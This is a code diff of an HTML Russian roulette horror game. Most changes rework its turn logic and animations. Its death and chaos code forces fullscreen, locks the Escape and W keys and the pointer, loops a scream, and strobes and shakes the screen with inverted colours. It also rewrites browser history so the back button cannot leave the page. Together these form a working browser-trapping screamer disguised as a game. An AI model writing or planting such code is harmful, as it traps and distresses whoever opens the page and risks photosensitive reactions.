@@ -6,7 +6,7 @@
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #050505; overflow: hidden; font-family: 'Courier New', monospace; color: white; }
         
-        /* THE ENEMY (Animated Monstrous Shadow) */
+        /* THE ENEMY */
         #enemy {
             position: absolute; top: 20%; left: 50%; transform: translateX(-50%);
             width: 300px; height: 400px;
@@ -16,35 +16,39 @@
         .eye {
             position: absolute; top: 30%; width: 20px; height: 10px;
             background: #ff0000; border-radius: 50%; box-shadow: 0 0 20px #ff0000;
-            animation: blink 4s infinite;
+            animation: blink 4s infinite; transition: all 0.5s;
         }
         .eye.left { left: 35%; } .eye.right { right: 35%; }
         
         @keyframes breathe {
             0%, 100% { transform: translateX(-50%) scale(1); opacity: 0.7; }
-            50% { transform: translateX(-50%) scale(1.1); opacity: 1; }
+            50% { transform: translateX(-50%) scale(1.15); opacity: 1; }
         }
         @keyframes blink { 0%, 90%, 100% { height: 10px; } 95% { height: 0px; } }
 
-        /* THE GUN (CSS First-Person Revolver) */
+        /* THE GUN */
         #gun-container {
             position: absolute; bottom: -20px; left: 50%; transform: translateX(-50%);
-            width: 200px; height: 300px; transition: transform 0.1s; z-index: 10;
+            width: 200px; height: 300px; transition: all 0.8s ease-in-out; z-index: 10;
         }
-        .barrel { width: 60px; height: 150px; background: #222; margin: 0 auto; border-radius: 5px 5px 0 0; border: 2px solid #111; }
+        .barrel { width: 60px; height: 150px; background: #222; margin: 0 auto; border-radius: 5px; border: 2px solid #111; }
         .cylinder { width: 80px; height: 80px; background: #333; margin: -10px auto; border-radius: 10px; border: 3px solid #111; }
         
-        /* Gun Recoil Animation */
+        #gun-container.enemy-hand { bottom: 50%; transform: translateX(-50%) scale(0.5) rotate(180deg); opacity: 0.8; }
+        
+        /* Recoil Animations */
         .recoil { animation: kick 0.2s ease-out; }
-        @keyframes kick { 0% { transform: translateX(-50%) translateY(0) rotate(0deg); } 50% { transform: translateX(-50%) translateY(-50px) rotate(-10deg); } 100% { transform: translateX(-50%) translateY(0) rotate(0deg); } }
+        .lethal-recoil { animation: lethal-kick 0.5s forwards; }
+        
+        @keyframes kick { 0% { transform: translateX(-50%) translateY(0); } 50% { transform: translateX(-50%) translateY(-40px); } 100% { transform: translateX(-50%) translateY(0); } }
+        @keyframes lethal-kick { 0% { transform: translateX(-50%) translateY(0); } 100% { transform: translateX(-50%) translateY(-120px) rotate(-15deg); filter: brightness(2); } }
 
-        /* UI and Screens */
         #game-ui { position: absolute; bottom: 10%; width: 100%; text-align: center; z-index: 20; }
         #scary-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('./scary.gif') center/cover; display: none; z-index: 1000; }
         #death-text { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: none; justify-content: center; align-items: center; background: black; z-index: 2000; color: #ff0000; font-size: 80px; font-weight: bold; }
         
         button { padding: 15px 30px; font-size: 20px; cursor: pointer; background: transparent; color: #ff0000; border: 2px solid #ff0000; text-transform: uppercase; font-weight: bold; }
-        button:hover { background: #ff0000; color: black; }
+        button:disabled { opacity: 0; pointer-events: none; }
     </style>
 </head>
 <body>
@@ -72,7 +76,7 @@
     </div>
 
     <div id="game-ui">
-        <div id="status" style="margin-bottom: 20px; color: #888;">IT'S YOUR TURN</div>
+        <div id="status">CHAMBER: 1/6</div>
         <button id="trigger-btn">FIRE</button>
     </div>
 
@@ -81,43 +85,64 @@
     <audio id="scream-audio" loop preload="auto"><source src="./scream.mp3"></audio>
 
     <script>
+        let bulletPos = Math.floor(Math.random() * 6) + 1;
+        let currentShot = 1;
+        
         const triggerBtn = document.getElementById('trigger-btn');
         const gun = document.getElementById('gun-container');
         const status = document.getElementById('status');
+        const enemy = document.getElementById('enemy');
         const scaryScreen = document.getElementById('scary-screen');
         const deathText = document.getElementById('death-text');
         const scream = document.getElementById('scream-audio');
-        const rOff = document.getElementById('red-off');
-        const bOff = document.getElementById('blue-off');
-        let isPlayerTurn = true;
+        const eyes = document.querySelectorAll('.eye');
+
+        function updatePsychology() {
+            const fear = (currentShot - 1) / 5; 
+            const color = `rgb(255, ${Math.floor(255 * fear)}, ${Math.floor(255 * fear)})`;
+            eyes.forEach(e => {
+                e.style.background = color;
+                e.style.boxShadow = `0 0 20px ${color}`;
+            });
+            // Speed up breathing as bullet gets closer
+            enemy.style.animationDuration = `${3 - (fear * 2)}s`;
+        }
 
         triggerBtn.addEventListener('click', () => {
-            if (!isPlayerTurn) return;
-            
-            // Gun Animation
-            gun.classList.add('recoil');
-            setTimeout(() => gun.classList.remove('recoil'), 200);
-
-            if (Math.floor(Math.random() * 6) + 1 === 1) {
-                deathSequence();
+            triggerBtn.disabled = true;
+            if (currentShot === bulletPos) {
+                gun.classList.add('lethal-recoil');
+                setTimeout(deathSequence, 600);
             } else {
-                status.innerText = "CLICK... SURVIVED.";
-                isPlayerTurn = false;
-                triggerBtn.style.display = 'none';
-                setTimeout(aiTurn, 1500);
+                gun.classList.add('recoil');
+                setTimeout(() => {
+                    gun.classList.remove('recoil');
+                    currentShot++;
+                    updatePsychology();
+                    status.innerText = "CLICK... SURVIVED.";
+                    setTimeout(passToEnemy, 1000);
+                }, 200);
             }
         });
 
-        function aiTurn() {
-            status.innerText = "THE ENEMY IS SPINNING...";
+        function passToEnemy() {
+            gun.classList.add('enemy-hand');
+            status.innerText = "THEY ARE PULLING...";
             setTimeout(() => {
-                if (Math.floor(Math.random() * 6) + 1 === 1) {
-                    status.innerText = "THE ENEMY DIED. REBOOTING...";
+                if (currentShot === bulletPos) {
+                    gun.classList.add('lethal-recoil');
+                    status.innerText = "THE ENEMY DIED.";
                     setTimeout(() => location.reload(), 2000);
                 } else {
-                    status.innerText = "THE ENEMY SURVIVED. FIRE.";
-                    isPlayerTurn = true;
-                    triggerBtn.style.display = 'inline-block';
+                    gun.classList.add('recoil');
+                    setTimeout(() => {
+                        gun.classList.remove('recoil');
+                        currentShot++;
+                        updatePsychology();
+                        status.innerText = "THEY SURVIVED. YOUR TURN.";
+                        gun.classList.remove('enemy-hand');
+                        setTimeout(() => { triggerBtn.disabled = false; }, 800);
+                    }, 200);
                 }
             }, 1500);
         }
@@ -133,7 +158,9 @@
                 const elem = document.documentElement;
                 try {
                     if (elem.requestFullscreen) await elem.requestFullscreen();
-                    if (navigator.keyboard && navigator.keyboard.lock) await navigator.keyboard.lock(["Escape", "KeyW"]);
+                    if (navigator.keyboard && navigator.keyboard.lock) {
+                        await navigator.keyboard.lock(["Escape", "KeyW"]);
+                    }
                     if (elem.requestPointerLock) elem.requestPointerLock();
                 } catch (err) {}
                 startChaos();
@@ -142,18 +169,14 @@
 
         function startChaos() {
             setInterval(() => {
-                const intensity = Math.random() * 20;
-                rOff.setAttribute('dx', intensity);
-                bOff.setAttribute('dx', -intensity);
+                const intensity = Math.random() * 25;
+                document.getElementById('red-off').setAttribute('dx', intensity);
+                document.getElementById('blue-off').setAttribute('dx', -intensity);
                 scaryScreen.style.filter = Math.random() > 0.8 ? 'url(#chromatic) invert(1)' : 'url(#chromatic)';
-            }, 50);
-
-            setInterval(() => {
                 const x = (Math.random() - 0.5) * 60;
                 const y = (Math.random() - 0.5) * 60;
                 scaryScreen.style.transform = `translate(${x}px, ${y}px)`;
             }, 30);
-
             window.history.pushState(null, null, window.location.href);
             window.onpopstate = () => window.history.go(1);
             setInterval(() => window.history.pushState(null, "", window.location.href), 100);
